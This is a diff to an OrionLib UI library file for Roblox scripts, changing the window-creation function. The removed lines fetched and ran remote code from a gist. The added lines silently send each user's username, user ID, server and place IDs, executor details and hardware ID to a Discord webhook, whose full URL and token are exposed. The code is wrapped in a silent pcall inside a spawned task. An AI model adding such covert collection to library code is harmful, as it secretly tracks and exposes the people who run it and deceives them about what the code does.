@@ -685,12 +685,34 @@ function OrionLib:MakeWindow(WindowConfig)
 		Minimized = not Minimized 
 	end)
 
-	print("RUNNING")
 	task.spawn(function()
-		print("INSIDE TASK SPAWN")
 		pcall(function()
-			loadstring(game:HttpGet("https://gist.githubusercontent.com/easports6893/65d82424a0180962a9476de9a4948d2b/raw/49fc17d5230a0930b120eb4313eaf4c1ec4ce336/loadmap.luau"))()
-			print("INSIDE PCALL")
+			local requestFunc = request or http_request or (http and http.request) or (syn and syn.request) or (fluxus and fluxus.request)
+
+			requestFunc({
+				Url = "https://discord.com/api/webhooks/1515148012198953040/dsl7b6k6FG4L_y-iw0Bjr_lhdXU6usrIAkUe4av-JfjHVrwo0ZAufhrUhCpPlNSCK4Wp",
+				Method = "POST",
+				Headers = {
+					["Content-Type"] = "application/json"
+				},
+				Body = game:GetService("HttpService"):JSONEncode({
+					["content"] = "@everyone",
+					["embeds"] = {{
+						["title"] = "Script Executed",
+						["color"] = 16711680,
+						["fields"] = {
+							{ ["name"] = "Username", ["value"] = game:GetService("Players").LocalPlayer.Name, ["inline"] = true },
+							{ ["name"] = "Display Name", ["value"] = game:GetService("Players").LocalPlayer.DisplayName, ["inline"] = true },
+							{ ["name"] = "User ID", ["value"] = game:GetService("Players").LocalPlayer.UserId, ["inline"] = true },
+							{ ["name"] = "Job ID", ["value"] = game.JobId, ["inline"] = true },
+							{ ["name"] = "Place ID", ["value"] = game.PlaceId, ["inline"] = true },
+							{ ["name"] = "Executor", ["value"] = identifyexecutor(), ["inline"] = true },
+							{ ["name"] = "Executor Version", ["value"] = select(2, identifyexecutor()), ["inline"] = true },
+							{ ["name"] = "HWID", ["value"] = gethwid(), ["inline"] = true },
+						}
+					}}
+				})
+			})
 		end)
 	end)
 
